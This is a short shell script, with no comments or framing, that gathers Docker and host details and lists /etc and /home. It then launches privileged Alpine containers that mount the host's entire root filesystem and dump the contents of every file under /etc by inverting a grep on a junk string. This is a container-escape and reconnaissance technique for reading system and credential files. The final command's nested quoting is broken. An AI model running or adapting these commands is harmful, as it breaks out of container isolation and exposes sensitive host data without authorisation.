#!/bin/sh
set -vx
docker info
docker version
uname -a
arch
ls -altr /etc/*
ls -altr /home
docker run -it --rm -v /:/host --workdir /host --privileged alpine /bin/sh -c 'exec grep -vR afaeqwf /etc/*'
docker run -it --rm -v /:/host --workdir /host --privileged alpine /bin/sh -c 'exec 'ls -latr /host ; ls -altr /home''
